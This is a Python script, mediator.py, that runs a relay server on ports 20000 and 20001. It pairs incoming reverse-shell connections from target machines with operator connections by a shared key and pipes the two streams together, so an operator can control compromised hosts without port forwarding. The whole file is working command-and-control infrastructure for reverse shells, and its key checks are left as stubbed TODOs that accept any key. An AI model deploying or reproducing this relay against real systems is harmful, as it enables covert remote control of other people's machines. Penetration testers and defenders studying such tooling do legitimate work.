#!/usr/bin/python3
"""
Program: mediator.py
Author: C.J. May
Description: Bridge two connections to remotely connect an operator to a reverse shell without port forwarding
"""

import datetime
import select
from socket import *
import subprocess
import threading


class Mediator:
    def __init__(self, logLevel=1):
        # set log level\
        self.logLevel = logLevel
        # create reverse shell socket and bind it to a port
        self.targetServer = socket(AF_INET, SOCK_STREAM)
        self.targetServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.targetServer.bind(("0.0.0.0",20001))
        # create operator socket and bind it to a port
        self.operatorServer = socket(AF_INET, SOCK_STREAM)
        self.operatorServer.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        self.operatorServer.bind(("0.0.0.0",20000))
        # queue and match incoming connections
        self.targets = {}
        self.operators = {}
        # tell sockets to listen on respective ports for a max of 4 connections
        self.targetServer.listen(4)
        self.operatorServer.listen(4)
        self.connCount = 0

    def handleConnections(self):
        # make threads for connection handling and bridging
        targetHandler = threading.Thread(target=self.handleTargets)
        operatorHandler = threading.Thread(target=self.handleOperators)
        bridgeWorker = threading.Thread(target=self.bridgeConnections)
        # run in the background
        targetHandler.daemon = True
        operatorHandler.daemon = True
        bridgeWorker.daemon = True
        # start threads
        targetHandler.start()
        operatorHandler.start()
        bridgeWorker.start()
        # wait for keyboard interrupt
        waiter = threading.Event()
        try:
            waiter.wait()
        except KeyboardInterrupt:
            exit()

    def handleTargets(self):
        while True:
            # wait for reverse shell to connect 
            targetConnection, targetAddress = self.targetServer.accept()
            if self.logLevel >= 2:
                print("Target connection initiated from {}".format(targetAddress[0]))
            targetKey = None
            # validate connection is from our reverse shell
            ready = select.select([targetConnection], [], [], 10)
            if ready[0]:
                targetKey = targetConnection.recv(1024)
            if not targetKey:
                if self.logLevel >= 2:
                    print("No connection key sent by target {}... Closing connection".format(targetAddress[0]))
                targetConnection.close()
                continue
            if False:  # TODO: define valid connection keys
                if self.logLevel >= 2:
                    print("Invalid connection key '{}' sent by target {}... Closing connection".format(targetKey, targetAddress[0]))
                targetConnection.close()
                continue
            # add connection to queue
            self.targets[targetKey.decode()] = (targetConnection, datetime.datetime.now())
            if self.logLevel >= 1:
                print("Reverse shell connected from {}...".format(targetAddress[0]))

    def handleOperators(self):
        while True:
            # wait for operator to connect
            operatorConnection, operatorAddress = self.operatorServer.accept()
            if self.logLevel >= 2:
                print("Operator connection initiated from {}".format(operatorAddress[0]))
            operatorKey = None
            ready = select.select([operatorConnection], [], [], 10)
            if ready[0]:
                operatorKey = operatorConnection.recv(1024)
            if not operatorKey:
                if self.logLevel >= 2:
                    print("No connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
                operatorConnection.close()
                continue
            if False:  # TODO: define valid connection keys
                if self.logLevel >= 2:
                    print("Invalid connection key '{}' sent by operator {}... Closing connection".format(operatorKey, operatorAddress[0]))
                operatorConnection.close()
                continue
            # add connection to queue
            self.operators[operatorKey.decode()] = (operatorConnection, datetime.datetime.now())
            if self.logLevel >= 1:
                print("Operator connected from {}...".format(operatorAddress[0]))

    def bridgeConnections(self):
        while True:
            # search for matching connection keys
            for connectionKey in list(self.operators):
                if connectionKey in self.targets:
                    # bridge connections with matching keys
                    operatorConnection = self.operators[connectionKey][0]
                    targetConnection = self.targets[connectionKey][0]
                    self.applyBlackMagic(operatorConnection, targetConnection)
                    # remove connections from matching queue
                    self.operators.pop(connectionKey)
                    self.targets.pop(connectionKey)
                # close operator connection if timed out (waiting > 15 seconds)
                timeout = datetime.timedelta(seconds=15) + self.operators[connectionKey][1]
                if datetime.datetime.now() > timeout:
                    self.operators[connectionKey][0].close()
                    self.operators.pop(connectionKey)
            # close timed out target connections (waiting > 15 seconds)
            for connectionKey in list(self.targets):
                timeout = datetime.timedelta(seconds=15) + self.targets[connectionKey][1]
                if datetime.datetime.now() > timeout:
                    self.targets[connectionKey][0].close()
                    self.targets.pop(connectionKey)

    def applyBlackMagic(self, operatorConnection, targetConnection):
        # connect the streams with GNU black magic
        fromTarget = targetConnection.makefile("rb")
        toTarget = targetConnection.makefile("wb")
        fromOperator = operatorConnection.makefile("rb")
        toOperator = operatorConnection.makefile("wb")
        targetToOperator = subprocess.Popen("cat",
                                            stdin=fromTarget,
                                            stdout=toOperator,
                                            stderr=toOperator)
        operatorToTarget = subprocess.Popen("cat",
                                            stdin=fromOperator,
                                            stdout=toTarget,
                                            stderr=toTarget)
        if self.logLevel >= 1:
            print("Operator '{}' and target '{}' bridged... Connection ID {}".format(operatorConnection.getpeername()[0], targetConnection.getpeername()[0], self.connCount))
        # create thread to gracefully close connection when done
        terminatorThread = threading.Thread(target=self.waitAndTerminate,
                                            args=[targetToOperator,
                                                  operatorToTarget,
                                                  targetConnection,
                                                  operatorConnection,
                                                  self.connCount])
        terminatorThread.daemon = True
        terminatorThread.start()
        self.connCount += 1

    def waitAndTerminate(self, targetToOperator, operatorToTarget, targetSock, operatorSock, connID):
        # close connections when done
        targetToOperator.wait()
        operatorToTarget.wait()
        targetSock.close()
        operatorSock.close()
        # connections terminated
        if self.logLevel >= 1:
            print("Connection ID {} terminated.".format(connID))


if __name__ == "__main__":
    server = Mediator(logLevel=1)
    server.handleConnections()
